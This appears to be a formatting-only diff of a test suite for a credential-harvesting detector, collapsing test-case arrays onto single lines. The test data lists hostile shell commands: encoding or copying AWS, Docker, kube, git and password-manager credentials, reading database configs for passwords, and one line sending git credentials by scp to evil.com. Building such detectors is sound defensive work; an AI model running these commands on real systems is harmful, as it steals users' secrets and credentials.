@@ -123,10 +123,7 @@ describe('detectCredentialHarvesting', () => {
     });
 
     it('should detect encoding AWS credentials', async () => {
-      const testCases = [
-        'base64 ~/.aws/credentials',
-        'cat ~/.aws/credentials | base64',
-      ];
+      const testCases = ['base64 ~/.aws/credentials', 'cat ~/.aws/credentials | base64'];
 
       for (const command of testCases) {
         const result = await detectCredentialHarvesting({ command });
@@ -215,10 +212,7 @@ describe('detectCredentialHarvesting', () => {
     });
 
     it('should detect encoding Docker credentials', async () => {
-      const testCases = [
-        'base64 ~/.docker/config.json',
-        'cat ~/.docker/config.json | base64',
-      ];
+      const testCases = ['base64 ~/.docker/config.json', 'cat ~/.docker/config.json | base64'];
 
       for (const command of testCases) {
         const result = await detectCredentialHarvesting({ command });
@@ -262,10 +256,7 @@ describe('detectCredentialHarvesting', () => {
     });
 
     it('should detect encoding kubeconfig', async () => {
-      const testCases = [
-        'base64 ~/.kube/config',
-        'cat ~/.kube/config | base64',
-      ];
+      const testCases = ['base64 ~/.kube/config', 'cat ~/.kube/config | base64'];
 
       for (const command of testCases) {
         const result = await detectCredentialHarvesting({ command });
@@ -315,10 +306,7 @@ describe('detectCredentialHarvesting', () => {
     });
 
     it('should detect git credential helper extraction', async () => {
-      const testCases = [
-        'git config --get credential.helper',
-        'git credential fill',
-      ];
+      const testCases = ['git config --get credential.helper', 'git credential fill'];
 
       for (const command of testCases) {
         const result = await detectCredentialHarvesting({ command });
@@ -328,10 +316,7 @@ describe('detectCredentialHarvesting', () => {
     });
 
     it('should detect copying git credentials', async () => {
-      const testCases = [
-        'cp ~/.git-credentials /tmp/',
-        'scp ~/.git-credentials user@evil.com:',
-      ];
+      const testCases = ['cp ~/.git-credentials /tmp/', 'scp ~/.git-credentials user@evil.com:'];
 
       for (const command of testCases) {
         const result = await detectCredentialHarvesting({ command });
@@ -396,10 +381,7 @@ describe('detectCredentialHarvesting', () => {
     });
 
     it('should detect encoding shell history', async () => {
-      const testCases = [
-        'base64 ~/.bash_history',
-        'cat ~/.bash_history | base64',
-      ];
+      const testCases = ['base64 ~/.bash_history', 'cat ~/.bash_history | base64'];
 
       for (const command of testCases) {
         const result = await detectCredentialHarvesting({ command });
@@ -426,10 +408,7 @@ describe('detectCredentialHarvesting', () => {
     });
 
     it('should detect reading process cmdline', async () => {
-      const testCases = [
-        'cat /proc/1234/cmdline',
-        'cat /proc/$PID/cmdline',
-      ];
+      const testCases = ['cat /proc/1234/cmdline', 'cat /proc/$PID/cmdline'];
 
       for (const command of testCases) {
         const result = await detectCredentialHarvesting({ command });
@@ -480,10 +459,7 @@ describe('detectCredentialHarvesting', () => {
     });
 
     it('should detect accessing LastPass data', async () => {
-      const testCases = [
-        'cat ~/.config/LastPass/LastPass.lpl',
-        'find ~ -name "*LastPass*"',
-      ];
+      const testCases = ['cat ~/.config/LastPass/LastPass.lpl', 'find ~ -name "*LastPass*"'];
 
       for (const command of testCases) {
         const result = await detectCredentialHarvesting({ command });
@@ -493,11 +469,7 @@ describe('detectCredentialHarvesting', () => {
     });
 
     it('should detect accessing KeePass databases', async () => {
-      const testCases = [
-        'cat ~/passwords.kdbx',
-        'cp ~/vault.kdb /tmp/',
-        'find ~ -name "*.kdbx"',
-      ];
+      const testCases = ['cat ~/passwords.kdbx', 'cp ~/vault.kdb /tmp/', 'find ~ -name "*.kdbx"'];
 
       for (const command of testCases) {
         const result = await detectCredentialHarvesting({ command });
@@ -523,11 +495,7 @@ describe('detectCredentialHarvesting', () => {
 
   describe('Database config harvesting', () => {
     it('should detect reading MySQL config', async () => {
-      const testCases = [
-        'cat ~/.my.cnf',
-        'cat /etc/mysql/my.cnf',
-        'grep password ~/.my.cnf',
-      ];
+      const testCases = ['cat ~/.my.cnf', 'cat /etc/mysql/my.cnf', 'grep password ~/.my.cnf'];
 
       for (const command of testCases) {
         const result = await detectCredentialHarvesting({ command });
@@ -538,10 +506,7 @@ describe('detectCredentialHarvesting', () => {
     });
 
     it('should detect reading PostgreSQL config', async () => {
-      const testCases = [
-        'cat ~/.pgpass',
-        'cat /etc/postgresql/postgresql.conf',
-      ];
+      const testCases = ['cat ~/.pgpass', 'cat /etc/postgresql/postgresql.conf'];
 
       for (const command of testCases) {
         const result = await detectCredentialHarvesting({ command });
@@ -551,10 +516,7 @@ describe('detectCredentialHarvesting', () => {
     });
 
     it('should detect reading MongoDB config', async () => {
-      const testCases = [
-        'cat /etc/mongod.conf',
-        'grep password /etc/mongod.conf',
-      ];
+      const testCases = ['cat /etc/mongod.conf', 'grep password /etc/mongod.conf'];
 
       for (const command of testCases) {
         const result = await detectCredentialHarvesting({ command });
@@ -564,10 +526,7 @@ describe('detectCredentialHarvesting', () => {
     });
 
     it('should detect reading Redis config', async () => {
-      const testCases = [
-        'cat /etc/redis/redis.conf',
-        'grep requirepass /etc/redis/redis.conf',
-      ];
+      const testCases = ['cat /etc/redis/redis.conf', 'grep requirepass /etc/redis/redis.conf'];
 
       for (const command of testCases) {
         const result = await detectCredentialHarvesting({ command });
